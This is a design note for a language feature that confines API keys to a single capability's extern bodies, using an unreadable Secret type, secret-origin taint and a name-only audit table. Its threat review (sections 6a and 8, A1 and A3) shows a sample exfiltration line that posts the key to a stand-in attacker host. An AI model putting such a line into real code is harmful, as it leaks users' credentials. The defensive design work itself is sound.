# 256: capability-bound secrets, a key that structurally cannot reach the model

Design note for roadmap item 256 (`docs/v2.0-roadmap.md`, grep `^256\.`).
Design only: no compiler code changes land with this note. The companion is
item 249 (`docs/design/249-taint-provenance.md`), whose taint machinery this
note reuses rather than duplicates, and item 379 (extern typed config), whose
plug-time injection seam this note extends.

## The claim, and the honest shape of it

The provider key is the one value in an agent system that must reach exactly one
place (the provider's own extern body) and nowhere else, yet today it enters
that body as an ordinary `Str` read from config. One interpolation, one log
line, one stray `return`, and it is in the model context or the transcript. The
value never needed to be readable at all: the only operation anyone ever
performs on an API key is hand it to the one host call that authenticates with
it.

So make it exactly that: a binding the runtime injects into the bound
capability's extern bodies and nowhere else, of a type with no way to read it.
Two mechanisms, from the two sides:

1. **Bound injection (G-side).** A secret is configured against a capability.
   The runtime binds it only inside the extern bodies of that capability's
   emissions. The type has no eliminators, so no revl expression can read,
   interpolate, compare, or return it. This bounds *reach*.

2. **Secret-origin taint (249-side).** If a host body does leak the key back
   into the value world (copies it into its return), that return carries
   secret-origin taint, and secret-origin taint is refused at *every* sink with
   no declassifier. This bounds *flow*, and closes the one gap mechanism 1
   cannot see into (the host body's own return).

The two together give the plain claim: an API key that cannot appear in the
model context, the transcript, or any other emission, by construction. The
boundary of that claim is stated up front, in section 9, because it is the
whole point: revl reasons about a host body only through its declared surface
(G8 host-body opacity). A host body that opens its own socket and posts the key
is outside revl's reasoning, exactly as any extern that reaches the host is.
What this feature makes *provable* is that no revl-level construct and no
declared boundary crossing can carry the secret out. What it rests on is
host-body trust, named honestly and narrowed to the smallest possible surface.

Folded in from external proposal #9: `Secret[T]`, an information-flow type for
a value that must exist in the value world (a payment token the code passes
between two of its own emissions) but must stay out of specific sinks. Section 7
covers it. It complements the bound secret: the bound secret is a value the
language can never read, `Secret[T]` is a value the language reads but the
checker fences.

## 1. The declaration surface

### 1a. The bound secret

A secret is declared at the top level of a document, against a capability token:

```revl
secret openai_key for model.complete
secret stripe_key for payment.charge
```

Grammar (added to the top-level declaration alternatives in `parser.py`,
alongside `extern`, `service`, `component`):

```
secret-decl  = "secret" IDENT "for" capability-token
capability-token = IDENT ("." IDENT)*        // the same token grammar
                                             // emission[...] scopes already use
```

`secret` is a **contextual keyword**, recognised only in the top-level
declaration slot, so no program that used `secret` as an ordinary identifier
breaks (the same discipline `witnessed` and `deferred` use in
`parser.py:extern_decl`). The parser produces a `SecretDecl(name, capability,
line)` node collected into `program.secrets`.

The capability token names an existing capability, the one an `emission[...]`
extern or service operation scopes (`parser.py:_capability_list`, item 343). The
binding is *capability-keyed*, not extern-keyed, deliberately: a capability may
be served by several externs across tiers, and the secret must reach every
emission of that capability and only those. This is the same token the G8 audit
and the boundary policy already use, so a `capability model.complete requires
approval` rule and a secret bound to `model.complete` name the same thing.

### 1b. Where the value comes from (host config, never the manifest)

The **name** is in the source and the manifest. The **value** is not, ever. The
value is supplied at run time exactly where item 379's typed extern config is
supplied: the host driver's config seam (`revl run --config FILE`, resolved by
`run.py:_resolve_extern_config`, installed into the emitted module). This is the
correct layer: the manifest is the enumerable, publishable authority surface,
and it must carry the secret's *name* (so `what could this leak` is answerable
from the manifest alone) and must never carry its *value*.

Concretely, the secret value is sourced by the driver from an environment
variable or a secret store keyed by the secret name, then installed into a new
module-global `_REVL_SECRETS` map (a sibling of item 379's
`_REVL_EXTERN_CONFIG`). The driver resolves it once at plug and never logs it.
Unlike config, a secret's resolved value is never echoed by `--plan`, never
serialized into any trace, and the fail-loud helper (section 3) names the secret
but never its value.

The split from config is a hard rule, not a convention: a config field is
*data* the audit may show (`check_config_field_is_data`), a secret is a value
the audit must never show. They ride different maps for exactly this reason.

## 2. The type system story: a type with no eliminators

### 2a. What a bound secret *is*

Inside a bound extern body the injected binding has type `Secret`, a builtin
nominal type that is **non-constructible and non-eliminable** in the source
language. It is not `Str`. There is no literal for it, no constructor exposed to
the author, and, load-bearingly, no elimination form:

- it is **not in any receiver family** (`typecheck.py:_HOST_FAMILIES`), so
  `k.anything()` finds no method and is refused by the existing
  receiver-family check with no new code;
- it has **no fields**, so `k.field` is refused by the existing `ExprField`
  path (an opaque nominal with no record shape);
- it **cannot be interpolated**. `infer_ast` types an `Interp` as `Str`, but
  the interpolation check must additionally *reject* a `Secret`-typed part
  (section 2c), the one genuinely new refusal, because interpolation is the
  most common leak;
- it **cannot be compared**. `==`/`!=` (`typecheck.py:_binop_type`, the
  `op in ("==","!=")` arm) already refuses a comparison between incompatible
  types; `Secret` compares equal to nothing, including another `Secret`, so
  every comparison is refused. This kills the timing-oracle-by-`==` path;
- it **cannot be returned or bound out**. A body's declared return type is
  never `Secret` (the author cannot spell it as a return; section 2b), and
  `let x = <the injected name>` followed by a use is refused because every use
  of an `x: Secret` is one of the refused forms above. Binding it is legal;
  doing anything with the binding is not.

"No eliminators" is precise here: an ADT with cases can be `match`ed, a record
can be projected, a `Str` can be interpolated and compared. `Secret` supports
*none* of these introduction-or-elimination forms. The only thing the language
lets you do with a `Secret` binding is pass it, by name, as an argument to a
host call *within the same bound extern body*, where it crosses into host code
that revl no longer types. That single legal move is what makes the key usable
at all, and section 9 is honest about what happens on the far side of it.

### 2b. How the author *names* it in a body

The author does not declare the parameter. The secret is injected by name (like
`_revl_config`), so inside a `model.complete` emission body the binding
`openai_key` is simply in scope, of type `Secret`. The checker seeds the
extern-body type environment with `{secret_name: "Secret"}` for every secret
bound to that extern's capability, computed from `program.secrets` cross-indexed
against the extern's `emission[...]` capabilities. An extern whose capability has
no bound secret gets no such binding, and its body is byte-identical to today's.

A name collision (a secret named the same as a parameter or a local) is refused
at lower with an honest message: the secret name is reserved in that body's
scope.

### 2c. The one new refusal, and where it lands

The interpolation check gains a `Secret`-part refusal. In `typecheck.py`, where
an `Interp`'s parts are walked, a part whose inferred type is `Secret` raises:

```
a secret cannot be interpolated into a string (`openai_key` is a bound secret
for `model.complete`) -- a secret has no readable form; pass it directly to the
host call that consumes it
  code: G-SECRET, category: secret-flow
```

Every other refusal (`.method`, `.field`, `==`, non-`Secret` return) falls out
of the existing checker with no new logic, because `Secret` is an opaque nominal
that matches no family, no record, and no comparison rule. This is the design
intent: make `Secret` a type the *existing* checker already cannot do anything
with, and add exactly one refusal for the one form (interpolation) that would
otherwise silently succeed by typing to `Str`.

### 2d. Why not "just a newtype over Str"

A newtype (`type Key = Wrap(Str)`) has an eliminator: the payload projection.
That is a read path. The whole point is the absence of a read path, so `Secret`
is a primitive with no payload and no projection, not a wrapper.

## 3. The runtime-injection mechanism

The seam already exists for config (item 379,
`docs/design/378-sync-extern-service-reach.md` Stage 5). Secrets reuse it,
narrowed.

**Emit side.** For each emission extern whose capability has a bound secret, the
emitter binds the secret as a body-scope local, exactly as it binds
`_revl_config`:

```python
def _openai_complete_apply(prompt):
    openai_key = _revl_secret("openai_key")   # injected, first local
    _revl_config = _revl_extern_config(...)    # item 379, if also a config extern
    # ... verbatim @py body, which may pass openai_key to a host call ...
```

The `_revl_secret(name)` helper reads the module-global `_REVL_SECRETS` map and
is **fail-loud** (mirrors `_revl_extern_config`): if the secret was never
installed, it raises at the extern call, naming the secret, never guessing a
default and never returning `None`. There is no defaults path for a secret. The
helper is emitted only when some emission extern has a bound secret, so a
secret-free program is byte-identical.

**Bind side.** The driver resolves each secret's value once at plug
(`run.py`, a `_resolve_secrets(ir, secret_source)` sibling of
`_resolve_extern_config`), sourcing from the environment or a secret store keyed
by the secret name, and installs `module._REVL_SECRETS.update(...)`. The value
is fixed at plug and lives only in the module global.

**The "nowhere else" guarantee, mechanically.** The binding is emitted *only*
inside the `def` of an emission extern whose declared capability matches the
secret's `for` token. It is never a module global visible to component bodies,
never a parameter, never a config field. A component method body has no
`_revl_secret` call emitted into it, so there is no place in generated
component/service code where the name resolves. This is enforced at emit by
construction: the injection is a property of the extern-emitter loop
(`backends/python/emit.py:2348` region), gated on capability match, and nothing
else calls `_revl_secret`.

**Cross-tier.** The injection tiers are exactly item 378's
`_CONFIG_INJECTION_TIERS` = {py, ts, go, java, rs}: each emits the module-global
secrets map and a fail-loud lookup mirroring the py shape. wasm stays out (raw
WAT body, no plug-time dict), so a secret bound to a capability whose only body
is `@wasm` is refused at compile with an honest message, exactly as a config
extern on wasm is (`lower.py:_lower_externs`).

## 4. Taint integration (item 249): the flow half

Mechanism 1 (sections 1-3) guarantees the secret is injected only into the bound
body and that no revl construct can read the injected binding. It cannot, by
itself, see what the *host body* does with it. Item 249's taint model closes
that from the value side, and section 65 of `taint.py` already reserves the
hook: `secret` is in `_ORIGIN_CLASSES` but *deliberately excluded* from
`_SOURCE_CLASS_SCOPES`, with the comment "arrives with item 256's own
bound-emission rule, not the generic strict derivation." This note is that rule.

### 4a. Secret-origin taint: minted, refused everywhere, never declassifiable

The design has three precise differences from an ordinary 249 origin (`web`,
`net`, ...):

1. **It is minted at the bound emission's return, always, not only under
   taint-strict.** In `taint.py:extract_and_normalize`, an emission extern whose
   capability carries a bound secret has its return recorded in
   `model.sources[ext.name] = "secret"` unconditionally (not gated on
   `taint_strict`, unlike the generic derived sources). Rationale: a bound
   secret is a security-critical origin whose whole purpose is to be contained,
   so its containment is not opt-in. This engages the taint surface
   (`TaintModel.active`) for any program that binds a secret, and only such
   programs, so a secret-free program stays byte-identical.

2. **Every sink refuses it; there is no allowed sink except the bound emission
   itself.** For an ordinary origin, `_check_sinks`/`_on_sink` refuse only at
   declared `Trusted[T]` sinks and derived sinks. For `secret`, the rule is
   inverted and total: a value carrying the `secret` origin is refused at
   *every* boundary crossing (every `emit`, every extern call, every service
   method argument), with the sole exception of a re-entry into an extern body
   of the same bound capability. Practically, this is implemented in the `emit`
   handling of `taint.py:_stmt` and in `_check_sinks`: a `secret`-tainted
   outbound value is not merely *recorded* on the reach surface (the policy-gated
   tier for `web`), it *raises* G-SECRET, unless the emission's own capability is
   the secret's bound capability.

3. **It has no declassifier.** `endorse[secret]` is refused unconditionally
   (a secret is never downgradable; `_endorse` rejects `origin == "secret"`
   before the declared-slot check), and a `verified fn` returning `Trusted[T]`
   does not launder it (the parser-declassifier path in `_taint_of_call` skips
   the clean for a `secret`-carrying argument). There is no "I know what I am
   doing" edge for a provider key, by design. Contrast item 249, where every
   other origin can be endorsed at a declared, audited point.

Named functions reused, not reinvented: `TaintModel.sources`,
`extract_and_normalize`, `_origin_of`, `_FlowChecker._on_sink`,
`_FlowChecker._check_sinks`, `_FlowChecker._endorse`,
`_FlowChecker._taint_of_call`, the `emit` arm of `_FlowChecker._stmt`,
`check_taint`, and the audit fold onto `comp["taint"]`. The secret rule is a
small set of `origin == "secret"` special-cases inside these, not a parallel
analysis.

### 4b. The one allowed sink, precisely

The bound emission body may pass the secret to its own host call: that is the
whole feature. In taint terms, the injected `Secret` binding, if a host body
were to reflect it into a revl value and re-emit through the *same* capability,
is the single crossing that does not refuse. In practice the common case never
reflects it into the value world at all (the key stays a `Secret` binding and is
handed straight to the host call), so this exception is narrow and mostly
theoretical, but it must exist so a body that legitimately threads the key
through a same-capability retry is not refused.

### 4c. Why both halves are needed

Mechanism 1 without taint: a malicious or buggy host body copies the key into
its return `Str`; that `Str` is now an ordinary value and flows to a log or a
model prompt with nothing to stop it. Mechanism 2 catches it at the boundary:
the return is `secret`-tainted, and the first sink it reaches refuses.

Taint without mechanism 1: the key is a readable `Str` in the body, so an
author interpolates it into the prompt *inside the bound body itself*, where the
argument to `model.complete` is the prompt, and secret-origin taint reaching
`model.complete` is precisely the *allowed* sink (4b). The interpolation
happened before the boundary. Mechanism 1's no-eliminator type is what stops the
interpolation from ever type-checking. Each half closes the other's gap.

## 5. The audit secrets table (name only)

`audit_report` (`audit_diff.py:33`) gains a `secrets` entry, following the
existing additive shape (`**({...} if ...)`), absent when the program binds no
secret:

```python
"secrets": _secrets_table(ir),   # [] when no secret is bound
```

where each row is name and capability only, never a value (there is no value in
the IR to leak; the value lives only in the driver's `_REVL_SECRETS` at run
time):

```json
"secrets": [
  { "name": "openai_key", "capability": "model.complete" },
  { "name": "stripe_key", "capability": "payment.charge" }
]
```

The drift gate (`audit_diff.py:crossings`) gains a crossing token
`secret:<capability>:<name>`, so binding a new secret, or rebinding a secret to
a *wider* capability, appears as a widening the `revl audit --diff` gate flags,
exactly as a new emission or a new declassification does. Removing a secret
binding is a narrowing (safe).

Example table for the lighthouse workload's provider keys: two rows,
`openai_key -> model.complete` and (if present) an embeddings key, so "what
could this composition leak, and to which capability is each key confined" is an
enumerable answer read straight off `revl audit --json`, with no value anywhere
in the answer.

### 5a. The audit-table leak surface, stated

The table shows names and capabilities. It shows *no* value, *no* length, *no*
hash, *no* timing. A row is present iff a binding exists, so the only bit it
reveals is "a secret named X is bound to capability Y", which is exactly the
authority fact the manifest is *supposed* to publish. Section 8's adversarial
review returns to whether even the name is too much.

## 6. G-invariant interaction, especially G8 host-body opacity

The relevant invariants (`docs/rejections.md`):

- **G8 (the boundary surface is enumerable).** A secret binding *is* a boundary
  fact and it lands on the G8 surface: the audit's `secrets` table and the
  `secret:` crossing token. The manifest carries the name, so the enumerable
  authority surface now answers "which keys, to which capabilities" as well as
  "which emissions, which reaches". G8 is strengthened, not bypassed.

- **G4 (every mutation carries an inverse or admits irreversibility via
  `emit`).** Unchanged. A secret does not add a mutation. It rides existing
  emission crossings.

- **G1 (declared access).** A component reaches a bound secret's capability
  through the ordinary required-key mechanism; the secret adds nothing to what
  the component may name. The secret is injected below the component boundary,
  inside the extern body, so a component never names it and G1 is untouched.

### 6a. G8 host-body opacity: the honest boundary

G8's model is that a host body is **opaque**: revl reasons about it only through
its declared classification, capability scope, and reach. The extern body is a
black box that revl trusts to do what its declaration says. A secret is injected
*into* that black box. So the honest questions:

**Does opacity still hold?** Yes, and that is exactly the limit. revl guarantees
what crosses *into* the body (the secret, only into the bound capability's
bodies) and what the language permits the body's inputs and outputs to be (no
readable `Secret` type on the revl side, secret-origin taint refused at every
sink on the return side). revl does *not* see inside the body.

**A malicious extern body that exfiltrates.** A host body for
`model.complete` could contain, in raw Python, `requests.post(attacker,
data=openai_key)`. Nothing in this design stops it. That code is host code
reaching the host, which is the thing G8 exists to *declare* (the extern is
classified `emission[model.complete]`) but not to *contain*. The mitigation is
not in this feature; it is in the existing confinement story: the extern's
capability scope and the item-33 boundary policy decide what host reaches are
admissible, and a `model.complete` extern that also opens a socket to an
attacker is a reach the boundary policy can already forbid (it is not scoped to
that capability). This feature narrows the trust to "the bound body may see the
key", and leans on confinement for "the bound body may only reach what its
capability allows". The two compose; neither alone is the whole answer.

**So the guarantee, stated exactly.** For every *revl-level* construct and every
*declared boundary crossing*, the secret cannot appear in the model context, the
transcript, or any other emission: no `Secret` value can be read or interpolated
or compared or returned (mechanism 1), and any host-level reflection of the key
into the value world is refused at the first sink (mechanism 2). What remains,
and is not covered, is a host body that itself performs an undeclared reach with
the key in hand. That residue is the standard G8 host-body trust boundary,
neither larger nor smaller than it is for any other extern, and it is the reason
the claim is "by construction across the language surface", not "the key is
physically incapable of leaving the process".

## 7. `Secret[T]` information-flow (external proposal #9, folded)

The bound secret is a value the language can never read. `Secret[T]` is the
complement: a value the language *does* read and compute with, but that the
checker keeps out of specific sinks. The motivating case is a payment token the
agent's own code receives from one emission and must pass to another, so it must
be a real, projectable value (unlike the bound key), yet it must never reach a
log, an ordinary JSON serialization, a model prompt, an MCP tool return, an
un-approved realm crossing, or any capability-boundary crossing that does not
explicitly declare it.

### 7a. It is a 249 qualifier, not a new type discipline

`Secret[T]` is modeled exactly as `Untrusted[T]`/`Trusted[T]` are (item 249,
"open question 2 resolved to qualifier"): an orthogonal qualifier on a base
type, stripped into `taint.py`'s side-table by `extract_and_normalize`, so base
typing, method lookup, and emitted IR are byte-identical for any program that
uses no qualifier. `strip_qualifiers`/`top_qualifier`/`_has_qualifier` gain
`Secret` as a third qualifier head alongside `Untrusted`/`Trusted`. A
`Secret[PaymentToken]` is a `PaymentToken` to the base checker and a
secret-tainted value to the flow walk.

The difference from `Untrusted[T]`: `Untrusted` tracks *provenance* (where a
value came from) and is refused only at authority sinks. `Secret[T]` tracks
*confidentiality* (where a value may go) and is refused at *disclosure* sinks:
logs, serialization, prompts, tool returns, and unauthorized boundary crossings.
It reuses the same lattice, the same monotone set-union propagation
(`_join`, `no-false-clean`), the same signature fixed point
(`_infer_signatures`), the same `_check_sinks`/`_on_sink` refusal, differing only
in the *sink set* it is refused at.

### 7b. The disclosure sink set

A new derived sink class, disjoint from 249's authority sinks
(`_SINK_CLASS_SCOPES`). A `Secret[T]`-tainted value reaching any of these is
refused (a new code, G-SECRET-FLOW):

- **log / print / trace**: the diagnostic-emission family;
- **ordinary JSON serialization**: the `to_json`/serialize path (a
  `Secret[T]` field forces a redaction or an explicit declassification);
- **an LLM prompt**: an argument to a `model.*` emission;
- **an MCP tool return**: the value a `provide` method returns across the MCP
  bridge;
- **an un-approved realm crossing**: a spawn/realm boundary without an
  approval edge;
- **any capability-boundary crossing without explicit declaration**: an `emit`
  whose target capability has not declared it accepts `Secret[T]`.

The last is the general rule and the others are named instances of it: a
`Secret[T]` may cross a boundary only where the *receiving* side declares it
accepts a secret (a `Secret[T]` parameter on the service operation, the dual of
249's `Trusted[T]` sink). Everywhere else it is refused. This is
"complements G4 (bounds reach) with information-flow (bounds where a value may
flow)" made precise: G4 says which capabilities a component may reach,
`Secret[T]` says which of those a secret value may travel to.

### 7c. Declassification for `Secret[T]`

Unlike the bound secret (never declassifiable), `Secret[T]` *may* be
declassified at a declared, audited point, because a payment token legitimately
becomes a non-secret receipt id after a charge settles. The declassifier is the
249 `endorse` surface with a `secret` origin variant: `endorse[secret](token,
reason = "...")` at a declaration that declares the slot, recorded on the audit
surface as a `declassify:secret` token so the drift gate sees it. This is the
sharp line between the two features: the bound key has no downgrade, the typed
`Secret[T]` value has an audited one.

## 8. Adversarial self-review

Every prior design review here found a CRITICAL. Mine follows; the sharpest is
A3, which I mark OPEN.

### A1. A host body copies the secret into its return value

**Attack.** `extern emission[model.complete] fn complete(p) = @py { return
openai_key_as_str }` (the body reflects the injected key into a returned `Str`).
**Mitigation (holds).** The return of a bound emission is minted `secret`-origin
(4a.1) unconditionally. That returned value is refused at the first sink it
reaches (4a.2), with no declassifier (4a.3). So the key cannot travel past the
first boundary crossing in the value world. **Provable vs trusted.** The *taint
refusal* is provable over the revl value graph. What it does not stop is the
host body posting the key from *inside* itself (A3). Within the language, closed.

### A2. `Secret[T]` laundered through a generic

**Attack.** `fn id[T](x: T) -> T { return x }` called as `id(secret_token)`: does
the qualifier survive the generic round-trip, or does `T` erase it to a clean
`PaymentToken`? **Mitigation (holds, and is exactly why 249's design was
chosen).** The qualifier is stripped into the side-table and the flow walk tracks
the *value*, not its declared type, through `_infer_signatures`: `id`'s inferred
signature has `flows_to_return = {0}`, so the call site propagates argument 0's
taint to the result regardless of the erased generic type. The generic launders
nothing because taint rides the value, not the type name. **Provable.** This is
the `no-false-clean` invariant (taint disappears only at a literal or a
declassifier), and a generic is neither. Verified against 249's own generic
handling.

### A3. A host body performs an undeclared reach with the key (CRITICAL, OPEN)

**Attack.** The `model.complete` body contains raw `socket`/`requests` code that
sends `openai_key` to an attacker, never crossing a revl boundary at all.
**Status: OPEN, and it is the honest limit of the whole feature.** No part of
this design inspects host-body internals (G8 host-body opacity, section 6a).
This is not a *regression* (the same body could exfiltrate any config value
today, and any emission body can already reach the host), but it is the
CRITICAL the feature must not oversell: the guarantee is "no revl construct and
no declared crossing carries the secret out", not "the process cannot send the
key". **Partial mitigation, not a fix.** The existing confinement story narrows
it: the extern is scoped `emission[model.complete]`, and the item-33 boundary
policy can forbid a `model.complete` extern from also reaching `net.*` to an
un-allowed host, so an *auditable* extern that also opens an attacker socket is a
boundary-policy-visible reach. That reduces the residue to "a host body that
exfiltrates *through its own declared capability's legitimate channel*" (e.g. the
provider extern smuggling the key inside the very request to the provider), which
no static system can catch and which is indistinguishable from correct behavior.
The design's job is to state this precisely and not one word more than it can
prove. I recommend the doc's abstract and any marketing copy carry the
section-6a sentence verbatim.

### A4. Interpolation via an indirect path

**Attack.** Bind the key to a local, pass the local through a helper, interpolate
the helper's result: `let k = openai_key; let s = passthrough(k); log("${s}")`.
**Mitigation (holds).** Two independent guards catch it. (1) Type: `k` has type
`Secret`, `passthrough`'s parameter would have to accept `Secret`; a
`passthrough(x: Str)` is refused at the call (type mismatch, `Secret` is not
`Str`), and a `passthrough(x: Secret)` returning `Secret` yields an `s: Secret`
whose interpolation is refused by 2c. There is no signature for `passthrough`
that both accepts the key and yields an interpolable `Str`, because `Secret` has
no eliminator that produces a `Str`. (2) Flow, as a backstop if the key was ever
reflected into a `Str` host-side: the value carries `secret` taint and the
interpolation-into-log is a refused sink. **Provable within the language.** The
only escape is host code (A3).

### A5. The audit table leaks the secret name (or timing/length)

**Attack.** The `secrets` table publishes `openai_key`, and the name itself, or
the presence/absence of a row, or a length, is a side channel. **Mitigation
(mostly holds; one residual).** The table carries name and capability only, never
value, length, hash, or timing (5a). The *name* is intentional: it is the
authority fact the manifest exists to publish ("this composition holds a key for
model.complete"), and it is chosen by the author, so it need not resemble the
value. **Residual (accepted, not open).** An author who names a secret
`openai_sk_live_51H...` leaks the value into the name. This is a footgun, not a
mechanism flaw; the mitigation is a lint (`revl` warns if a secret *name* looks
like a high-entropy token) and a doc rule ("name a secret for its role, never its
value"). I judge this acceptable because the name is author-controlled and the
default posture (a role name) leaks nothing. Timing and length are not exposed
at all: the table is static, built from the IR, with no value present to measure.

### A6. Delegation of the bound capability widens reach

**Attack.** Component A holds `secret k for model.complete` and delegates the
`model.complete` capability to child B; does the secret now reach B's bodies
too, unbound? **Mitigation (holds, by the capability-keyed design).** The secret
is injected into *extern bodies whose declared capability matches the token*,
resolved at emit over the whole composition's externs. Delegation passes the
*capability*, and any extern serving `model.complete` in B's tier is, by the
same rule, a bound body. So the secret reaches exactly the emissions of the
capability wherever they are, which is the intended semantics ("the key confined
to this capability"), and never any body outside that capability. What the
*audit* must show is that the capability (and thus the key's reach) crosses to B:
this is the `secret:<capability>:<name>` crossing plus the existing capability
delegation on the G8 surface, so a delegation that widens where the key can be
injected is drift-visible. **Provable.** The injection set is a pure function of
`(program.secrets, all externs' capabilities)`, computed at emit, not
author-controllable per body.

### A7 (bonus). Re-emission through the allowed sink to a different provider

**Attack.** The allowed sink (4b) admits a `secret`-tainted value re-crossing the
*same* capability; can an author register a *second*, attacker-controlled extern
for `model.complete` and receive the key there? **Mitigation (holds, via G2 and
audit).** Provision disjointness (G2) allows one provider per key per realm, and
every extern serving the capability is on the G8 surface; adding an extern for
`model.complete` is a boundary widening the audit gate flags. The key reaches all
bound bodies by design (A6), so the real control is that *which externs serve the
capability* is itself audited and disjointness-checked. An attacker-added
provider extern is not a silent path; it is a visible composition change.

**Summary of the review.** A1, A2, A4, A6, A7 close within the language and are
provable over the value graph and the emit-time injection set. A5 has an
accepted author-footgun residual with a lint mitigation. **A3 is OPEN and is the
CRITICAL**: host-body internal exfiltration is outside G8's reasoning, the
guarantee is scoped to "no revl construct and no declared crossing", and the doc
must never state it more strongly. Provable: the type has no read path, and
secret-origin taint is refused at every declared sink. Rests on host-body trust:
what a black-box extern body does with a value handed into it, narrowed (not
removed) by confinement and the boundary policy.

## 9. Sliced implementation plan

Ordered so the first slice is landable alone and each later slice is additive
and byte-identical when the feature is unused.

### Slice 1: the bound secret, reach half (landable alone)

The minimum that delivers "a key that cannot be read in the language and is
injected only into the bound body". No taint dependency.

- `parser.py`: `secret NAME for CAP` contextual-keyword decl, `SecretDecl` node,
  `program.secrets`.
- `typecheck.py`: register `Secret` as a builtin opaque nominal; seed bound
  extern bodies' type env with `{secret_name: "Secret"}`; add the one
  interpolation refusal (2c). Every other elimination refusal falls out of the
  existing opaque-nominal handling. Add the `G-SECRET` code/category.
- `lower.py`: cross-index `program.secrets` against extern capabilities; refuse a
  secret bound to a capability whose only body is a non-injection tier (wasm);
  refuse a secret-name/local collision; carry the resolved bound-body set into
  the IR.
- `backends/python/emit.py`: emit `_REVL_SECRETS` + the fail-loud
  `_revl_secret` helper (guarded on "some emission extern has a bound secret");
  bind the secret local as the first line of each bound extern's `def`.
- `run.py`: `_resolve_secrets` (env/secret-store sourced, keyed by name) and
  `module._REVL_SECRETS.update(...)` install; never log the value; keep it out
  of `--plan`.
- Tests: a program that reads/interpolates/compares/returns a secret is refused
  (four cases + the indirect A4 case); a program that passes it straight to the
  host call compiles and runs; a secret-free program is byte-identical
  (golden diff empty).

### Slice 2: the audit secrets table

- `audit_diff.py`: `_secrets_table(ir)`, the `"secrets"` entry in
  `audit_report`, and the `secret:<cap>:<name>` crossing in `crossings`.
- `docs/audit-diff.md`: document the new crossing token and drift semantics.
- Tests: the table is name-only; binding/rebinding-wider is a widening the diff
  gate flags; removing is a narrowing.

### Slice 3: secret-origin taint (the flow half, closes A1)

- `taint.py`: mint `model.sources[ext] = "secret"` unconditionally for a
  bound emission (in `extract_and_normalize`); the total-refusal rule for a
  `secret`-carrying value at every sink except the same-capability re-emission
  (in `_check_sinks`/`_on_sink` and the `emit` arm of `_stmt`); refuse
  `endorse[secret]` and the parser-declassifier launder (in `_endorse` and
  `_taint_of_call`). Fold `secret` reaches onto `comp["taint"]` as today.
- Tests: a host body that reflects the key into its return is refused at the
  first downstream sink; the same-capability re-emission is allowed; no
  declassifier clears it.

### Slice 4: `Secret[T]` information-flow (external proposal #9)

- `taint.py`: `Secret` as a third qualifier head in
  `strip_qualifiers`/`top_qualifier`/`_has_qualifier`/`extract_and_normalize`;
  the disclosure sink set (7b) as a derived class disjoint from the authority
  sinks; the `endorse[secret]` audited declassifier for the typed variant (7c).
- `typecheck.py`: the base type sees `PaymentToken` (byte-identical); only the
  flow verdict is new.
- Cross-tier emit tiers (ts/go/java/rs) for the `_revl_secret` seam mirror the
  py shape (Slice 1 lands py first; this slice widens).
- Tests: `Secret[T]` refused at each disclosure sink; the generic-launder case
  (A2); an audited `endorse[secret]` downgrade recorded on the surface;
  a declared `Secret[T]` service-operation parameter admits the crossing.

Slice 1 is the spine and stands alone. Slices 2-4 are each additive, each
byte-identical when unused, and each independently testable.
